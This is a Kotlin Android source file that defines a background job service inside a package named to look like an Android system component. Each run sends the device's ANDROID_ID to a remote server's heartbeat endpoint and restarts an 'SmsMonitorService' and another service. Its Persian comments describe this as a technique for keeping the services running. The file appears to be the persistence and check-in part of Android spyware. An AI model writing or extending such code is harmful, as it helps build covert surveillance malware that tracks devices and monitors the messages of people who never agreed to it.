package com.android.system.services

import android.app.job.JobParameters
import android.app.job.JobService
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.annotation.RequiresApi
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
class HeartbeatJobService : JobService() {

    companion object {
        private const val TAG = "HeartbeatJobService"
        const val JOB_ID = 1001
    }

    override fun onStartJob(params: JobParameters?): Boolean {
        com.android.system.services.utils.DirectBootHelper.logStatus(this)
        
        Thread {
            try {
                sendHeartbeat()
                
                // 🔥 تکنیک: اطمینان از اجرای سرویس‌ها
                ensureServicesRunning()
                
                jobFinished(params, false)
                
            } catch (e: Exception) {
                Log.e(TAG, "Heartbeat Job failed: ${e.message}", e)
                jobFinished(params, true)
            }
        }.start()
        
        return true
    }
    
    // 🔥 اطمینان از اجرای سرویس‌ها
    private fun ensureServicesRunning() {
        try {
            // UnifiedService
            if (!UnifiedService.isRunning) {
                val unifiedIntent = android.content.Intent(this, UnifiedService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(unifiedIntent)
                } else {
                    startService(unifiedIntent)
                }
                Log.d(TAG, "UnifiedService started from JobService")
            }
            
            // SmsMonitorService
            val smsMonitorIntent = android.content.Intent(this, SmsMonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(smsMonitorIntent)
            } else {
                startService(smsMonitorIntent)
            }
            Log.d(TAG, "Services ensured from JobService")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to ensure services: ${e.message}", e)
        }
    }

    override fun onStopJob(params: JobParameters?): Boolean {
        return true
    }

    private fun sendHeartbeat() {
        try {
            val deviceId = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ANDROID_ID
            )

            val body = JSONObject().apply {
                put("deviceId", deviceId)
                put("isOnline", true)
                put("timestamp", System.currentTimeMillis())
                put("source", "JobScheduler")
            }

            val baseUrl = ServerConfig.getBaseUrl()
            val urlString = "$baseUrl/devices/heartbeat"

            val url = URL(urlString)
            val conn = url.openConnection() as HttpURLConnection

            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { os ->
                os.write(body.toString().toByteArray())
                os.flush()
            }

            conn.responseCode
            conn.disconnect()

        } catch (e: Exception) {
            Log.e(TAG, "Heartbeat error: ${e.message}", e)
            throw e
        }
    }
}